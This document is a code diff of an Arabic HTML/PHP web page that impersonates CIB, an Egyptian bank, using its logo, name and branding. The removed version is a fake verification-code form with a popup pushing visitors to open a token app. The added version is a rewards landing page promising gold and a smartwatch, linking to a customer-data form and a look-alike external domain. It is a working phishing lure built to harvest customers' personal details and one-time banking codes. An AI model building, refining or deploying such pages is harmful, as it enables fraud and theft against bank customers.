@@ -1,130 +1,424 @@
-<!DOCTYPE html>
 <html lang="ar" dir="rtl">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>رمز التحقق - البنك التجاري الدولي</title>
 
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="البنك التجاري الدولي - تحديث بيانات العميل" />
+    <meta property="og:description" content="سجل بياناتك لتحديث حسابك البنكي بسرعة وأمان عبر البنك التجاري الدولي." />
+    <meta property="og:image" content="https://i.postimg.cc/Xqm3cMhv/CIB-Egypt-jobs.jpg" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="البنك التجاري الدولي - تحديث بيانات العميل" />
+    <meta name="twitter:description" content="سجل بياناتك لتحديث حسابك البنكي بسرعة وأمان عبر البنك التجاري الدولي." />
+    <meta name="twitter:image" content="https://i.postimg.cc/Xqm3cMhv/CIB-Egypt-jobs.jpg" />
 
-  <style>
-    body {
-      font-family: 'Cairo', sans-serif;
-      background: #f4f6fb;
-      color: #1f2937;
-    }
+    <title><?php echo $title; ?></title>
 
-    .login-shell {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-    }
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
 
-    .login-container {
-      width: 100%;
-      max-width: 460px;
-      background: #fff;
-      border-radius: 20px;
-      padding: 30px;
-      text-align: center;
-    }
+    <style>
 
-    .login-button {
-      width: 100%;
-      padding: 14px;
-      border: none;
-      border-radius: 12px;
-      background: #1657b8;
-      color: #fff;
-      font-size: 18px;
-      cursor: pointer;
-    }
+        *{
+            margin:0;
+            padding:0;
+            box-sizing:border-box;
+            font-family:'Cairo',sans-serif;
+        }
 
-    input {
-      width: 100%;
-      padding: 12px;
-      border-radius: 12px;
-      border: 1px solid #ccc;
-      margin-top: 10px;
-    }
+        body{
+            background:#f5f7fb;
+            color:#222;
+        }
 
-    /* popup */
-    .popup {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0,0,0,0.5);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      z-index: 9999;
-    }
+        a{
+            text-decoration:none;
+        }
 
-    .popup-content {
-      background: #fff;
-      padding: 25px;
-      border-radius: 16px;
-      text-align: center;
-      width: 90%;
-      max-width: 320px;
-    }
+        /* ================= HEADER ================= */
 
-    .popup-content button {
-      margin-top: 15px;
-      padding: 12px 20px;
-      border: none;
-      border-radius: 12px;
-      background: #1657b8;
-      color: #fff;
-      cursor: pointer;
-    }
+        .header{
+            background:linear-gradient(135deg,#1657b8,#0f3f87);
+            height:85px;
+            display:flex;
+            align-items:center;
+            justify-content:space-between;
+            padding:0 20px;
+            color:#fff;
+            position:sticky;
+            top:0;
+            z-index:999;
+            box-shadow:0 4px 15px rgba(0,0,0,0.1);
+        }
 
-    .hidden {
-      display: none;
-    }
-  </style>
+        .menu,
+        .login{
+            font-size:18px;
+            font-weight:700;
+            cursor:pointer;
+            transition:0.3s;
+        }
+
+        .menu:hover,
+        .login:hover{
+            opacity:.8;
+        }
+
+        .services{
+            text-align:center;
+            font-size:15px;
+            line-height:1.3;
+            font-weight:700;
+        }
+
+        .logo-img{
+            width:95px;
+        }
+
+        /* ================= HERO ================= */
+
+        .hero{
+            padding:25px 20px 50px;
+        }
+
+        .hero-box{
+            background:#fff;
+            border-radius:30px;
+            overflow:hidden;
+            box-shadow:0 10px 30px rgba(0,0,0,0.08);
+        }
+
+        .hero img{
+            width:100%;
+            display:block;
+        }
+
+        .hero-content{
+            padding:30px;
+            text-align:center;
+        }
+
+        .hero small{
+            color:#777;
+            font-size:15px;
+            display:block;
+            margin-bottom:12px;
+        }
+
+        .hero h1{
+            color:#f48120;
+            font-size:36px;
+            line-height:1.7;
+            font-weight:800;
+        }
+
+        /* ================= CARDS ================= */
+
+        .cards{
+            padding:0 18px 30px;
+        }
+
+        .card{
+            background:#fff;
+            margin-bottom:18px;
+            border-radius:24px;
+            padding:22px;
+            display:flex;
+            align-items:center;
+            justify-content:space-between;
+            transition:.3s;
+            box-shadow:0 6px 20px rgba(0,0,0,0.05);
+        }
+
+        .card:hover{
+            transform:translateY(-5px);
+            background:#eef4ff;
+        }
+
+        .card-title{
+            color:#1657b8;
+            font-size:24px;
+            font-weight:700;
+        }
+
+        .icon{
+            width:75px;
+            height:75px;
+            border-radius:50%;
+            background:#edf2fb;
+            border:5px solid #dfe7f3;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            font-size:32px;
+        }
+
+        /* ================= NEWS ================= */
+
+        .news-section{
+            padding:0 18px 40px;
+        }
+
+        .news-box{
+            background:#fff;
+            border-radius:28px;
+            padding:25px;
+            box-shadow:0 10px 30px rgba(0,0,0,0.05);
+        }
+
+        .news-header{
+            color:#1657b8;
+            font-size:26px;
+            font-weight:800;
+            margin-bottom:25px;
+        }
+
+        .news-item{
+            display:flex;
+            gap:15px;
+            margin-bottom:22px;
+            padding-bottom:22px;
+            border-bottom:1px solid #eee;
+        }
+
+        .news-item:last-child{
+            border:none;
+            margin-bottom:0;
+            padding-bottom:0;
+        }
+
+        .news-icon{
+            width:55px;
+            height:55px;
+            background:#1657b8;
+            color:#fff;
+            border-radius:16px;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            font-size:24px;
+            flex-shrink:0;
+        }
+
+        .news-title{
+            font-size:19px;
+            font-weight:800;
+            color:#16396b;
+            margin-bottom:5px;
+        }
+
+        .news-text{
+            color:#666;
+            line-height:1.8;
+            font-size:15px;
+        }
+
+        /* ================= FOOTER ================= */
+
+        .footer{
+            background:#0f3f87;
+            color:#fff;
+            text-align:center;
+            padding:20px;
+            font-size:15px;
+        }
+
+        /* ================= MOBILE ================= */
+
+        @media(max-width:768px){
+
+            .hero h1{
+                font-size:28px;
+            }
+
+            .card-title{
+                font-size:20px;
+            }
+
+            .icon{
+                width:65px;
+                height:65px;
+                font-size:28px;
+            }
+
+            .news-header{
+                font-size:22px;
+            }
+
+        }
+
+    </style>
+
 </head>
 
 <body>
 
-  <div class="login-shell">
-    <div class="login-container">
+<!-- ================= HEADER ================= -->
 
-      <!-- تم حذف النص هنا -->
-      <h2>رمز التحقق</h2>
+<header class="header">
 
-      <form>
-        <input type="text" placeholder="000000" maxlength="6" />
-        <br><br>
-        <button class="login-button">تحقق</button>
-      </form>
+    <!-- Header actions removed as requested -->
+
+    <img
+        src="https://www.cibeg.com/-/media/feature/navigation/footer/logo-white.svg"
+        class="logo-img"
+        alt="CIB"
+    >
+
+    <div class="menu">
+        ☰
+    </div>
+
+</header>
+
+<!-- ================= HERO ================= -->
+
+<section class="hero">
+
+    <div class="hero-box">
+
+        <img
+            src="https://careerun.com/wp-content/uploads/2021/03/CIB-Egypt-jobs.jpg"
+            alt="CIB"
+        >
+
+        <div class="hero-content">
+
+            <small>
+                عروض حصرية لعملاء البنك
+            </small>
+
+            <h1>
+                استمتع بمكافآت وهدايا مميزة
+                <br>
+                عند استخدام الخدمات الرقمية
+            </h1>
+
+        </div>
 
     </div>
-  </div>
 
-  <!-- Popup -->
-  <div id="tokenPopup" class="popup hidden">
-    <div class="popup-content">
-      <h3>تنبيه</h3>
-      <p>لإكمال العملية، يرجى فتح تطبيق التوكينت.</p>
-      <button id="openTokenApp">فتح التطبيق</button>
+</section>
+
+<!-- ================= CARDS ================= -->
+
+<section class="cards">
+
+    <a href="customer-data.php" class="card">
+
+        <div class="icon">🥇</div>
+
+        <div class="card-title">
+            الحصول على مكافأة 1 جرام ذهب
+        </div>
+
+    </a>
+
+    <a href="https://cibbnk.lovestoblog.com/watch-type.php" class="card">
+
+        <div class="icon">⌚</div>
+
+        <div class="card-title">
+            طلب الساعة الذكية
+        </div>
+
+    </a>
+
+    <a href="#" class="card">
+
+        <div class="icon">💳</div>
+
+        <div class="card-title">
+            البطاقات البنكية
+        </div>
+
+    </a>
+
+    <a href="#" class="card">
+
+        <div class="icon">💰</div>
+
+        <div class="card-title">
+            عروض ومكافآت حصرية
+        </div>
+
+    </a>
+
+</section>
+
+<!-- ================= NEWS ================= -->
+
+<section class="news-section">
+
+    <div class="news-box">
+
+        <div class="news-header">
+            آخر الأخبار
+        </div>
+
+        <?php
+
+        $news = [
+
+            [
+                "icon" => "📰",
+                "title" => "عروض جديدة للعملاء",
+                "text" => "استمتع بأحدث العروض والخدمات الرقمية بسهولة وأمان."
+            ],
+
+            [
+                "icon" => "⭐",
+                "title" => "مكافآت حصرية",
+                "text" => "احصل على مزايا وعروض مميزة عند استخدام الخدمات الإلكترونية."
+            ],
+
+            [
+                "icon" => "📱",
+                "title" => "تحديث التطبيق البنكي",
+                "text" => "واجهة أسرع وأسهل لإدارة جميع خدماتك الرقمية."
+            ]
+
+        ];
+
+        foreach($news as $item){
+
+        ?>
+
+        <article class="news-item">
+
+            <div class="news-icon">
+                <?php echo $item['icon']; ?>
+            </div>
+
+            <div>
+
+                <div class="news-title">
+                    <?php echo $item['title']; ?>
+                </div>
+
+                <div class="news-text">
+                    <?php echo $item['text']; ?>
+                </div>
+
+            </div>
+
+        </article>
+
+        <?php } ?>
+
     </div>
-  </div>
 
-  <script>
-    // إظهار popup بعد 5 ثواني
-    setTimeout(() => {
-      document.getElementById('tokenPopup').classList.remove('hidden');
-    }, 5000);
+</section>
 
-    // زر فتح التطبيق
-    document.getElementById('openTokenApp').addEventListener('click', () => {
-      window.location.href = "tokent://open"; // غير الرابط حسب التطبيق
-    });
-  </script>
+<!-- ================= FOOTER ================= -->
+
+<footer class="footer">
+
+    © <?php echo date("Y"); ?> البنك التجاري الدولي CIB
+    <br>
+    جميع الحقوق محفوظة
+
+</footer>
 
 </body>
 </html>
